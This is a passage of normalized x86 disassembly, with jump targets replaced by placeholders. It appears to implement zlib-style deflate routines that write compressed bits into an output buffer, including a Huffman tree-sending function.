mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0x5
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp + 0x14 ]
sub edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
sub ecx 0x4
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x1c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
mov edx 0x10
sub edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40939c
add esp 0xc
mov edx [ ebp + 0x10 ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40939c
add esp 0xc
mov esp ebp
pop ebp
retn
mov [ ebp - 0x20 ] 0x3
mov ecx 0x10
sub ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa76 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_40939c
push ebp
mov ebp esp
sub esp 0x5c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x6 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x10 ]
jge r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
mov [ ebp - 0x20 ] edx
mov eax 0x10
sub eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa74 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x24 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xabe ]
mov [ ebp - 0x50 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x50 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xaba ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab6 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xabc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x50 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xabc ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x54 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x54 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x50 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xab8 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xab4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x34 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x34 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x2c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0xb
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0xb
mov [ ebp - 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x5c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x5c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x58 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x58 ] 0x7
mov edx 0x10
sub edx [ ebp - 0x58 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x4c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x4c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x48 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x48 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x38 ] 0x2
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_409e74
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
